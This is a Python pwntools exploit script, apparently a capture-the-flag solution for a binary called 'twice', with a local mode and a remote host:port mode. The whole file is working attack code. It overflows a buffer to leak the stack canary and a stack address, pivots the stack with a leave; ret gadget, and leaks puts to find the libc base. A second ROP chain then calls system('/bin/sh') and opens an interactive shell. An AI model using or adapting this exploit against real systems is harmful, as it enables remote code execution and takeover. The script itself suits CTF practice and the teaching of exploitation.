#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './twice'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400923 # pop rdi ; ret
leave = 0x0000000000400879 # leave ; ret

# rop1
sea('>',cyclic(89))
ru(cyclic(89))
canary = u64('\x00'+rc(7))
info_addr('canary',canary)
stack = uu64(rc(6))
info_addr('stack',stack)

payload = p64(stack-0x70)
payload+= p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts'])
payload+= p64(elf.sym['main'])
# payload+= p64(0x400823)
payload = payload.ljust(88,'A')
payload+=p64(canary)
payload+= p64(stack-0x70)
payload+= p64(leave)
# debug()
sea('>',payload)

puts = uu64(ru('\x0a\x3e')[-6:])
info_addr('puts',puts)

libcbase = puts - libc.sym['puts']
info_addr('libcbase',libcbase)

binsh = libcbase + libc.search('/bin/sh').next()
system = libcbase + libc.sym['system']
info_addr('binsh',binsh)
info_addr('system',system)

# debug()
# rop2
se(cyclic(89))
ru(cyclic(89))
canary = u64('\x00'+rc(7))
info_addr('canary',canary)
stack = uu64(rc(6))
info_addr('stack',stack)

payload = cyclic(8)
payload+= p64(prdi) + p64(binsh) + p64(system)
payload+= p64(elf.sym['main'])
payload = payload.ljust(88,'A')
payload+=p64(canary)
payload+= p64(stack-0x70)
payload+= p64(leave)

sea('>',payload)

p.interactive()